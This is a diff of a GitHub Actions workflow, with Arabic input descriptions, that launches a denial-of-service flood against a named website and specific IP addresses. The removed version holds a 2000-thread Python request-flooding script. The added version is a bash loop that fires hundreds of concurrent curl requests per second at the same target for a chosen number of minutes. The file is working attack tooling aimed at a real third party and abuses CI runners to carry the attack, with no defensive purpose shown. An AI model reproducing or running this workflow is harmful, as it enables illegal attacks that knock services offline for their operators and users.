@@ -1,112 +1,46 @@
-name: 💀 UNLEASHED - NO LIMITS
+name: 💀 SHADOW - DIRECT ATTACK
 
 on:
   workflow_dispatch:
     inputs:
       duration:
-        description: 'مدة الهجوم بالدقائق'
+        description: 'المدة بالدقائق'
         required: true
-        default: '30'
+        default: '10'
 
 jobs:
-  unleashed:
+  attack:
     runs-on: ubuntu-latest
-    timeout-minutes: 360
     
     steps:
-      - name: Install Python & tools
+      - name: Install curl
+        run: sudo apt update && sudo apt install -y curl
+        
+      - name: DIRECT FLOOD ATTACK
         run: |
-          sudo apt update
-          sudo apt install -y python3 python3-pip
-          pip3 install requests --break-system-packages || pip3 install requests
-          
-      - name: Create nuclear attack script
-        run: |
-          cat > nuclear.py << 'EOF'
-          import requests
-          import threading
-          import time
-          import sys
-          from concurrent.futures import ThreadPoolExecutor
-          
-          target = "https://flixtn.com"
-          targets = [
-              "https://flixtn.com/",
-              "https://flixtn.com/api",
-              "https://flixtn.com/login",
-              "https://64.29.17.65/",
-              "https://216.198.79.65/",
-          ]
-          
-          stats = {"total": 0, "success": 0, "fail": 0}
-          lock = threading.Lock()
-          running = True
-          
-          def attack(url):
-              global running
-              while running:
-                  try:
-                      r = requests.get(
-                          url, 
-                          timeout=3,
-                          headers={
-                              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
-                              'Cache-Control': 'no-cache',
-                              'Pragma': 'no-cache'
-                          }
-                      )
-                      with lock:
-                          stats["total"] += 1
-                          if r.status_code < 500:
-                              stats["success"] += 1
-                          else:
-                              stats["fail"] += 1
-                  except:
-                      with lock:
-                          stats["total"] += 1
-                          stats["fail"] += 1
-          
-          print("💀 NUCLEAR ATTACK MODE ACTIVATED 💀")
-          print(f"Target: {target}")
-          print(f"Threads: 2000")
-          print("-----------------------------------")
-          
-          # تشغيل 2000 خيط
-          with ThreadPoolExecutor(max_workers=2000) as executor:
-              futures = []
-              for t in targets:
-                  for _ in range(400):
-                      futures.append(executor.submit(attack, t))
-              
-              start = time.time()
-              duration = int(sys.argv[1]) * 60 if len(sys.argv) > 1 else 1800
-              
-              while time.time() - start < duration:
-                  time.sleep(5)
-                  with lock:
-                      print(f"[{int(time.time() - start)}s] Total: {stats['total']} | Success: {stats['success']} | Fail: {stats['fail']}")
-              
-              running = False
-              time.sleep(2)
-              
-              print("\n📊 FINAL STATISTICS:")
-              print(f"   Total requests: {stats['total']}")
-              print(f"   Success: {stats['success']}")
-              print(f"   Failed: {stats['fail']}")
-              print(f"   Success rate: {stats['success']/stats['total']*100:.1f}%" if stats['total'] > 0 else "   Success rate: 0%")
-          EOF
-          
-      - name: 🔥 Execute Nuclear Attack
-        run: |
-          echo "╔════════════════════════════════════════════════╗"
-          echo "║     💀 UNLEASHED SHADOW MODE - NO LIMITS 💀     ║"
-          echo "╚════════════════════════════════════════════════╝"
-          echo ""
-          echo "🎯 Target: flixtn.com + IPs"
-          echo "⚡ Threads: 2000 concurrent"
-          echo "⏱️  Duration: ${{ github.event.inputs.duration }} minutes"
-          echo ""
-          echo "🔥 ATTACK IN PROGRESS 🔥"
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo "💀 SHADOW ATTACK STARTED"
+          echo "Target: flixtn.com"
+          echo "Duration: ${{ github.event.inputs.duration }} minutes"
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
           echo ""
           
-          python3 nuclear.py ${{ github.event.inputs.duration }}
+          END=$((SECONDS + (${{ github.event.inputs.duration }} * 60)))
+          COUNT=0
+          
+          while [ $SECONDS -lt $END ]; do
+            for i in {1..200}; do
+              curl -s -o /dev/null -w "%{http_code}\n" https://flixtn.com/ --max-time 2 &
+              curl -s -o /dev/null -w "%{http_code}\n" https://64.29.17.65/ --max-time 2 &
+            done
+            
+            COUNT=$((COUNT + 400))
+            echo "[$(date +%H:%M:%S)] 🔥 Sent $COUNT requests"
+            sleep 1
+          done
+          
+          echo ""
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo "✅ ATTACK COMPLETED"
+          echo "Total requests: $COUNT"
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
